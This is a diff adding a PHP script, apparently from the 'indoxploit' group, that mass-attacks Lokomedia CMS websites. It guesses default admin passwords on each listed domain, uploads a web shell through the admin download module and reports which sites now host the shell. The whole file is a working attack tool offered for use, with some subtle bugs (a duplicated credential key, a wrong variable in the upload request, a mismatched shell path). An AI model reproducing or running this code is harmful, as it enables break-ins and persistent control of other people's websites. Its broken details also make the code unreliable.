@@ -1,0 +1,66 @@
+<?php
+// indoxploit
+function cek($url) {
+    $ch = curl_init($url);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $res = curl_exec($ch);
+          curl_close($ch);
+    return $res;
+}
+function curl($url,$payload) {
+    $ch = curl_init($url);
+          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+          curl_setopt($ch, CURLOPT_POST, true);
+          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+          curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+          curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+          curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    $res = curl_exec($ch);
+          curl_close($ch);
+    return $res;
+}
+echo "<center>
+    <h1>Lokomedia Auto Tanem Shell</h1>
+    <form method='post'>
+    Domain: <br>
+    <textarea placeholder='http://www.target.com/' name='url' style='width: 500px; height: 250px;'></textarea><br>
+    <input type='submit' name='hajar' value='Xploit!'>
+    </form>";
+if($_POST['hajar']) {
+    $domain = explode("\r\n", $_POST['url']);
+    $up = array(
+        "admin" => "admin",
+        "admin" => "123456",
+        "indoxploit" => "indoxploit",
+        );
+    foreach($domain as $url) {
+        foreach($up as $user => $pass) {
+            $data1 = array(
+                "username" => $user,
+                "password" => $pass,
+                );
+            $login = curl($url."/adminweb/cek_login.php", $data1);
+            if(preg_match("/Logout|Administrator/", $login)) {
+                $file = "shellmu.php"; //1 dir dengan exploiternyaa
+                $data2 = array(
+                    "judul" => "indoxploit auto exploiter lokomedia",
+                    "fupload" => "@$file",
+                    "upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
+                    );
+                $ngirim = curl($url."/adminweb/modul/mod_download/aksi_download.php?module=download&act=input",$data);
+                if(preg_match("/indoxploit auto exploiter lokomedia/i", $ngirim)) {
+                    echo "[+] $url -> <font color=green>sukses login [ user: $user pass: $pass ]</font><br>";
+                    $cek = cek("$url/files/image.php");
+                    if(preg_match("/indoXploit/", $cek)) {
+                        echo "[+] $url/files/image.php -> <font color=green>shelmu.</font><br><br>";
+                    } else {
+                        echo "[-] <font color='#bb0000'>shellmu gaada.</font><br><br>";
+                    }
+                }
+            } else {
+                echo "[-] $url -> gagal login<br><br>";
+            }
+        }
+    }
+}
